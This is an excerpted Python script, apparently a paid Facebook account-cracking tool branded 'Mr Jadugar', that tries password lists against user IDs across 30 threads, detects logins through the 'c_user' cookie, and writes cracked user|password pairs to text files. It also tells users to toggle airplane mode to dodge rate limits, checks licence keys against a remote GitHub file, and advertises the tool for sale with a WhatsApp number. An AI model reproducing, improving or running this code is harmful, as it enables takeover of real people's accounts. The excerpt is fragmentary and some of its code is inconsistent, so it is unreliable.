...
from concurrent.futures import ThreadPoolExecutor as MrJadugar
...
logo = """________________Mr Jadugar _______________
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mJadugar_OK.txt' % (H, P, str(len(ok))))
	    #print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mJadugat_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[Jadu] {loop}|{len(self.id)} ok = {len(ok)}")#cp ={len(cp)})
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        #print('\r%s [Jadu-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Jadu_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            os.system("clear")
            print(logo)
            print("Use Airplane mode every 10 minutes")
            print(47*"-")
            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with MrJadugar(max_workers=30) as ssbworld:
...
def notice():
	...
	runtxt("\033[0;92m To Buy This Tool Contact With Jadugar")
	runtxt("\033[0;93m Whatsapp - +923475353500")
	subprocess.check_output(["am", "start", "https://m.me/kewwll.prince"])
...
class sex():
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/kashibaloch754/p/main/Approve.txt').text
			if basesplit in plr:
				Jadu()
			else:
				os.system('clear')
		...
		#print("%s [%s•%s] %sTOOL NAME : %sFile Cloning"%(G,R,G,B,G))
		#print("%s [%s•%s] %sVERSION   : %s1.0"%(G,R,G,B,G))
		#print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
		#print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
		#print("")
		#print("%s [%s>%s]%s TYPE irfan TO RUN THE TOOL %s(\033[0;92mPAID)"%(G,R,G,Y,B))
		#tanya = input("    \033[0;91m(>)\033[0;92m Type : ")
		#if tanya in ["", " "]:
			#Main()
		#elif tanya in ["irfan"]:
			#if basesplit in plr:
